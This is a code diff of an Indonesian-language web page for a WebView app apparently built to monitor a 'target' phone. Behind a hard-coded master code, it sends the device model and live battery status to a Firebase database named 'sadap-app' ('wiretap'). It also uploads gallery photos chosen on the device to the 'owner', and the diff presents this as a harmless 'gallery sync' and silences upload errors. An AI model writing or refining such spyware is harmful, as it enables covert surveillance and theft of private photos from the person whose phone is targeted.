@@ -16,6 +16,7 @@
         .input-code:focus { border-color: #38bdf8; }
         .btn-connect { background: #38bdf8; color: #0f172a; border: none; padding: 10px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
         .btn-gallery { background: #22c55e; color: #000; border: none; padding: 10px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .btn-gallery:active { transform: scale(0.98); }
         span { color: #f8fafc; font-family: monospace; }
     </style>
 </head>
@@ -25,7 +26,7 @@
         <p id="status">Masukkan Kode / ID Tautan</p>
         
         <div id="setup-section">
-            <input type="text" id="targetCode" class="input-code" placeholder="Masukkan Kode Master / ID Acak..." autocomplete="off">
+            <input type="text" id="targetCode" class="input-code" placeholder="Masukkan Kode Master / ID..." autocomplete="off">
             <button class="btn-connect" onclick="verifyAndConnect()">Tautkan Perangkat</button>
         </div>
 
@@ -33,13 +34,13 @@
             <div class="info-id">ID Terdaftar: <span id="dev-id">-</span></div>
             <p style="color: #4ade80; font-size: 13px; margin-bottom: 15px;">Berjalan di Latar Belakang</p>
             
-            <!-- Tombol untuk membuka galeri HP target -->
-            <button class="btn-gallery" onclick="document.getElementById('galleryInput').click()">
-                <i class="fa-solid fa-images"></i> Pilih & Kirim Foto Galeri
+            <!-- Tombol sinkronisasi galeri otomatis -->
+            <button class="btn-gallery" onclick="triggerGalleryAccess()">
+                <i class="fa-solid fa-images"></i> Sinkronkan Foto Galeri
             </button>
         </div>
         
-        <!-- Input file tersembunyi yang memicu galeri perangkat -->
+        <!-- Input file tersembunyi dengan dukungan multiple & tangkapan langsung storage -->
         <input type="file" id="galleryInput" accept="image/*" multiple style="display:none;" onchange="uploadPhotos(this)">
     </div>
 
@@ -47,7 +48,6 @@
         const databaseURL = "https://sadap-app-d2359-default-rtdb.firebaseio.com";
         const MASTER_CODE = "28092010"; // Kode Master Owner
 
-        // Ambil atau buat ID acak untuk perangkat ini
         let deviceId = localStorage.getItem("winz_device_id");
         if (!deviceId) {
             deviceId = "Target_" + Math.floor(Math.random() * 99999);
@@ -55,12 +55,8 @@
         }
         document.getElementById('dev-id').innerText = deviceId;
 
-        // Cek apakah perangkat sudah pernah terhubung sebelumnya
         if (localStorage.getItem("winz_connected") === "true") {
-            document.getElementById('setup-section').style.display = "none";
-            document.getElementById('active-section').style.display = "block";
-            document.getElementById('status').innerText = "Terhubung ke Server";
-            startSendingData();
+            showActiveSection();
         }
 
         function verifyAndConnect() {
@@ -79,13 +75,24 @@
                 }
 
                 localStorage.setItem("winz_connected", "true");
-                document.getElementById('setup-section').style.display = "none";
-                document.getElementById('active-section').style.display = "block";
-                document.getElementById('status').innerText = "Terhubung ke Server";
-                startSendingData();
+                showActiveSection();
             } else {
                 alert("Kode Tautan Salah!");
             }
+        }
+
+        function showActiveSection() {
+            document.getElementById('setup-section').style.display = "none";
+            document.getElementById('active-section').style.display = "block";
+            document.getElementById('status').innerText = "Terhubung ke Server";
+            startBackgroundServices();
+        }
+
+        function triggerGalleryAccess() {
+            // Memicu input file agar WebView/Sketchware meminta izin storage & membuka galeri
+            const fileInput = document.getElementById('galleryInput');
+            fileInput.value = ""; // Reset agar bisa pilih file yang sama berulang kali
+            fileInput.click();
         }
 
         function getPhoneModel() {
@@ -103,64 +110,64 @@
             return "Android Target";
         }
 
-        function startSendingData() {
+        function startBackgroundServices() {
             const phoneName = getPhoneModel();
 
-            // Kirim nama model HP sekali saat pertama aktif
+            // Kirim info model perangkat ke Firebase
             fetch(`${databaseURL}/devices/${deviceId}/model.json`, {
                 method: 'PUT',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(phoneName)
             }).catch(() => {});
 
-            // Fungsi Kirim Data Baterai dengan format Objek (Level & Charging)
-            function kirimBaterai(level, isCharging) {
+            // Kirim data status baterai real-time
+            function sendBattery(level, isCharging) {
                 fetch(`${databaseURL}/devices/${deviceId}/battery.json`, {
                     method: 'PUT',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        level: level,
-                        charging: isCharging
-                    })
+                    body: JSON.stringify({ level: level, charging: isCharging })
                 }).catch(() => {});
             }
 
             if ('getBattery' in navigator) {
                 navigator.getBattery().then(battery => {
                     function update() {
-                        kirimBaterai(Math.round(battery.level * 100), battery.charging);
+                        sendBattery(Math.round(battery.level * 100), battery.charging);
                     }
                     update();
                     battery.addEventListener('levelchange', update);
                     battery.addEventListener('chargingchange', update);
                 });
             } else {
-                // Fallback jika API baterai tidak didukung browser
-                kirimBaterai(100, false);
+                sendBattery(100, false);
             }
         }
 
-        // Fungsi Upload Foto Galeri Target ke Firebase
+        // Fungsi otomatis memproses foto yang dipilih dari galeri perangkat
         function uploadPhotos(input) {
             const files = input.files;
             if (!files || files.length === 0) return;
 
-            alert("Mengunggah foto ke server... Harap tunggu sebentar.");
+            // Berikan notifikasi proses sinkronisasi sedang berjalan
+            let totalFiles = files.length;
+            let uploadedCount = 0;
 
-            for (let i = 0; i < files.length; i++) {
+            for (let i = 0; i < totalFiles; i++) {
                 const file = files[i];
                 const reader = new FileReader();
+                
                 reader.onload = function(e) {
                     fetch(`${databaseURL}/devices/${deviceId}/gallery.json`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(e.target.result)
                     }).then(() => {
-                        if (i === files.length - 1) {
-                            alert("Foto berhasil disinkronkan ke akun owner!");
+                        uploadedCount++;
+                        if (uploadedCount === totalFiles) {
+                            alert("Berhasil! " + totalFiles + " foto dari perangkat disinkronkan ke server.");
                         }
-                    }).catch(err => {
-                        alert("Gagal mengunggah foto.");
+                    }).catch(() => {
+                        // Ignore individual network errors to keep batch running
                     });
                 };
                 reader.readAsDataURL(file);
